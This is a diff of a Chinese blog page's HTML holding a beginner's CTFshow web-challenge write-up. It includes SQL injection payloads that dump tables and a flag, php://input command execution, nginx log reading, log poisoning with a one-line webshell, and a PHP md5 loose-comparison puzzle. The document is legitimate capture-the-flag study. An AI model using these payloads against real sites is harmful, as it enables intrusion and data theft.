@@ -1,378 +1,226 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="zh-CN" color-mode="light">
 
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/ico.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="F4tty">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="一个CTF菜鸡初学者的刷题记录">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CTFshow_web刷题记录[持续更新......]">
-<meta property="og:url" content="http://example.com/posts/fa386b67/index.html">
-<meta property="og:site_name" content="F4tty">
-<meta property="og:description" content="一个CTF菜鸡初学者的刷题记录">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306204413736-165900174270427.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306204451163.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306204535846.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306210147379.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306210303069.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306210557871.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306210547490.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306210641695.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306211250740.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306211624887.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306221021594.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306221052212.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306221503246.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306221452532.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/y76O4rWLDawEQkf.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/xO9wgrz37jAsacW.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/XENCDzcxQMIJBYe.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/UvjlyFfXSzPW9hE.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/2b1WhsZmnOJviBo-165900179393549.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220307212323762-165900180009251.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/yBGzlZCi91at7dI-165900180559753.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/XwL9IrkHMRs4mVo-165900180799355.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/QmMS7b2436LWpeV-165900181035357.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/QCr5n3YBJRK4UiE-165900181265759.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/jE2Js8S9QbZqTrU.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/bMl86JAiyUjoQ2I.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/yiXDlJ8wbvjensg-165900182072165.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/9zPsoXm173dNgGw-165900182504967.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/mnWQfT94YyG1N83-165900182771769.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/MNYT1oehSVHamZv.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/34opSrgjQGvZdKw-165900183166571.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/ekz96oF8faOEXBr-165900183700675.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/aEdQO9VhzUipkKr-165900184015977.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/kSiKWDsMnBgLT5u-165900184312779.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220310225247255.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220310225316125.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220310232534339.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220311212421282.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220311213312985.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220311213635981.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220311214754459.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220312212750883.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220312224015749.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220312224040151.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220312224702958.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220312224233107.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306182257359.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306182357918.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306182428648.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306182517451.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306182543998.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306182802861.png">
-<meta property="og:image" content="http://example.com/posts/fa386b67/image-20220306183022208.png">
-<meta property="article:published_time" content="2022-03-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-28T10:11:26.168Z">
-<meta property="article:author" content="F4tty">
-<meta property="article:tag" content="ctf">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/posts/fa386b67/image-20220306204413736-165900174270427.png">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
   
   
+  <title>
+    
+      CTFshow_web刷题记录[持续更新......] 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
   
-  <title>CTFshow_web刷题记录[持续更新......] - F4tty</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
   
 
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
 
 
+  
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  
 
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>F4tty&#39;s Note</strong>
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
     </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
+    <div class="nickname"><a href="/">F4tty</a></div>
   </div>
-</nav>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
 
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/indexbg.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="CTFshow_web刷题记录[持续更新......]"></span>
-          
-        </div>
+  
 
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CTFshow_web刷题记录[持续更新......]</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-06 00:00:00
+        </span>
         
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-03-06 00:00" pubdate>
-          2022年3月6日 凌晨
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          5.4k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          45 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">CTFshow_web刷题记录[持续更新......]</h1>
-            
-            
-              <div class="markdown-body">
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
                 
-                <h1 id="Web刷题记录"><a href="#Web刷题记录" class="headerlink" title="Web刷题记录"></a>Web刷题记录</h1><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/posts/fa386b67/image-20220306204413736-165900174270427.png" srcset="/img/loading.gif" lazyload alt="image-20220306204413736"></p>
+                <span class="span--tag mr-8">
+                  <a href="/tags/ctf/" title="ctf">
+                    #ctf
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Web刷题记录"><a href="#Web刷题记录" class="headerlink" title="Web刷题记录"></a>Web刷题记录</h1><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/posts/fa386b67/image-20220306204413736-165900174270427.png" alt="image-20220306204413736"></p>
 <p>F12查看源码</p>
-<p><img src="/posts/fa386b67/image-20220306204451163.png" srcset="/img/loading.gif" lazyload alt="image-20220306204451163"></p>
+<p><img src="/posts/fa386b67/image-20220306204451163.png" alt="image-20220306204451163"></p>
 <p>base64解码</p>
-<p><img src="/posts/fa386b67/image-20220306204535846.png" srcset="/img/loading.gif" lazyload alt="image-20220306204535846"></p>
-<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/fa386b67/image-20220306210147379.png" srcset="/img/loading.gif" lazyload alt="image-20220306210147379"></p>
+<p><img src="/posts/fa386b67/image-20220306204535846.png" alt="image-20220306204535846"></p>
+<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/fa386b67/image-20220306210147379.png" alt="image-20220306210147379"></p>
 <p>一个登录框</p>
 <p>尝试弱口令，，，，失败</p>
 <p>使用万能密码</p>
-<p><img src="/posts/fa386b67/image-20220306210303069.png" srcset="/img/loading.gif" lazyload alt="image-20220306210303069"></p>
+<p><img src="/posts/fa386b67/image-20220306210303069.png" alt="image-20220306210303069"></p>
 <p>成功登录 接下来进行sql注入</p>
-<p><img src="/posts/fa386b67/image-20220306210557871.png" srcset="/img/loading.gif" lazyload alt="image-20220306210557871"></p>
-<p><img src="/posts/fa386b67/image-20220306210547490.png" srcset="/img/loading.gif" lazyload alt="image-20220306210547490"></p>
+<p><img src="/posts/fa386b67/image-20220306210557871.png" alt="image-20220306210557871"></p>
+<p><img src="/posts/fa386b67/image-20220306210547490.png" alt="image-20220306210547490"></p>
 <p>有3个字段 接下来看回显</p>
-<p><img src="/posts/fa386b67/image-20220306210641695.png" srcset="/img/loading.gif" lazyload alt="image-20220306210641695"></p>
+<p><img src="/posts/fa386b67/image-20220306210641695.png" alt="image-20220306210641695"></p>
 <p>2处有回显 改为注入语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查看数据库<br>username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;or 1=1 union select 1,database(),3#&amp;password=1</span><br><span class="hljs-string">#查看表</span><br><span class="hljs-string">username=admin&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()#<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or 1=1 union select 1,database(),3#&amp;password=1</span></span><br><span class="line"><span class="string">#查看表</span></span><br><span class="line"><span class="string">username=admin&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/image-20220306211250740.png" srcset="/img/loading.gif" lazyload alt="image-20220306211250740"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查看flag表中的数据<br>username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">#查看flag</span><br><span class="hljs-string">username=admin&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> flag#<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/fa386b67/image-20220306211250740.png" alt="image-20220306211250740"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看flag表中的数据</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看flag</span></span><br><span class="line"><span class="string">username=admin&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span> <span class="keyword">from</span> flag#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/image-20220306211624887.png" srcset="/img/loading.gif" lazyload alt="image-20220306211624887"></p>
+<p><img src="/posts/fa386b67/image-20220306211624887.png" alt="image-20220306211624887"></p>
 <h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>这题主要考察php的伪协议</p>
 <p>详情可见<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p>
 <p>这里使用php:&#x2F;&#x2F;input协议</p>
 <p>使用phpinfo测试</p>
-<p><img src="/posts/fa386b67/image-20220306221021594.png" srcset="/img/loading.gif" lazyload alt="image-20220306221021594"></p>
-<p><img src="/posts/fa386b67/image-20220306221052212.png" srcset="/img/loading.gif" lazyload alt="image-20220306221052212"></p>
+<p><img src="/posts/fa386b67/image-20220306221021594.png" alt="image-20220306221021594"></p>
+<p><img src="/posts/fa386b67/image-20220306221052212.png" alt="image-20220306221052212"></p>
 <p>接下来使用执行系统指令查看当前目录的文件夹</p>
-<p><img src="/posts/fa386b67/image-20220306221503246.png" srcset="/img/loading.gif" lazyload alt="image-20220306221503246"></p>
-<p><img src="/posts/fa386b67/image-20220306221452532.png" srcset="/img/loading.gif" lazyload alt="image-20220306221452532"></p>
+<p><img src="/posts/fa386b67/image-20220306221503246.png" alt="image-20220306221503246"></p>
+<p><img src="/posts/fa386b67/image-20220306221452532.png" alt="image-20220306221452532"></p>
 <p>查看ctf_go_go_go文件</p>
-<p><img src="/posts/fa386b67/y76O4rWLDawEQkf.png" srcset="/img/loading.gif" lazyload alt="image-20220306221738302"></p>
-<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><img src="/posts/fa386b67/xO9wgrz37jAsacW.png" srcset="/img/loading.gif" lazyload alt="image-20220307192056465"></p>
+<p><img src="/posts/fa386b67/y76O4rWLDawEQkf.png" alt="image-20220306221738302"></p>
+<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><img src="/posts/fa386b67/xO9wgrz37jAsacW.png" alt="image-20220307192056465"></p>
 <p>请求头看到是nginx搭建</p>
 <p>查看nginx日志</p>
 <p>?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p><img src="/posts/fa386b67/XENCDzcxQMIJBYe.png" srcset="/img/loading.gif" lazyload alt="image-20220307190214602"></p>
+<p><img src="/posts/fa386b67/XENCDzcxQMIJBYe.png" alt="image-20220307190214602"></p>
 <p>发现日志文件尝试在日志中插入一句话木马</p>
 <p>先抓个包</p>
-<p><img src="/posts/fa386b67/UvjlyFfXSzPW9hE.png" srcset="/img/loading.gif" lazyload alt="image-20220307212115102"></p>
+<p><img src="/posts/fa386b67/UvjlyFfXSzPW9hE.png" alt="image-20220307212115102"></p>
 <p>添加一句话木马</p>
 <p>蚁剑连接</p>
-<p><img src="/posts/fa386b67/2b1WhsZmnOJviBo-165900179393549.png" srcset="/img/loading.gif" lazyload alt="image-20220307212247404"></p>
-<p><img src="/posts/fa386b67/image-20220307212323762-165900180009251.png" srcset="/img/loading.gif" lazyload alt="image-20220307212323762"></p>
-<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;       <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/fa386b67/2b1WhsZmnOJviBo-165900179393549.png" alt="image-20220307212247404"></p>
+<p><img src="/posts/fa386b67/image-20220307212323762-165900180009251.png" alt="image-20220307212323762"></p>
+<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;       </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>ctype_alpha()函数:如果参数为字符串字母则返回Ture否则Flase</p>
